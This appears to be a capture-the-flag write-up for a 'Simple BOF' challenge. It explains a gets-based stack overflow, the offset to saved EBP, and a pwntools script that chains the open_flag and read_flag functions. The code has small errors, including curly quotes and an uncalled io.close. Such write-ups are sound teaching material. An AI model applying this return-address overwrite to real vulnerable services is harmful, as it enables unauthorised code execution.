# Simple BOF

The binary provided for the challenge awaits an input. An input of equal or greater than 24 bytes leads to a segmentation fault.


![Inline](../images/bof_1.png?raw=true)


The code provided in the C file is a little different. The buffer is 16 bytes in the code but GDB informs us that the source file is more recent than the binary.

![Inline](../images/bof_2.png?raw=true)


Looking at the C file, we find two convenient functions __open_flag__ and __read_flag__ that can help us display the flag.


Furthermore, the vulnerable function uses **gets** for the user input. We can exploit it to overflow the buffer.


## ROP CHAIN
There are two ways we can read the binary addresses of two functions.
In GDB we can execute

`info symbol <function name>`

or we can use context.binary we extracted from our ELF by calling 

`e.symbols[“<function name>”]` 



## PAYLOAD
Finally, we load everything we are going to send as our payload by concatinating 24 (0x18) of data to for the buffer followed by 4 (0x4) bytes of data to overwrite ebp and the binary addresses of the functions.


```python
# Offsets
buf2ebp = 0x18
#functions
open_flag = e.symbols[“open_flag”]
read_flag = e.symbols['read_flag']

payload = ''
# Buffer Size + Saved EBP
payload += cyclic(buf2ebp+4)
payload += p32(open_flag)
payload += p32(read_flag)
```

## FINAL EXPLOIT
The full exploit code turns out to be:

```python
from pwn import *
# Our target
target = './simple-bof'
e = context.binary = ELF(target,checksec=True)
context.log_level='debug'
io = process(target)

# Offsets
buf2ebp = 0x18
#functions
open_flag = e.symbols[“open_flag”]
read_flag = e.symbols['read_flag']

payload = ''
# Buffer Size + Saved EBP
payload += cyclic(buf2ebp+4)
payload += p32(open_flag)
payload += p32(read_flag)
io.sendline(payload)
io.recvline()

io.close
```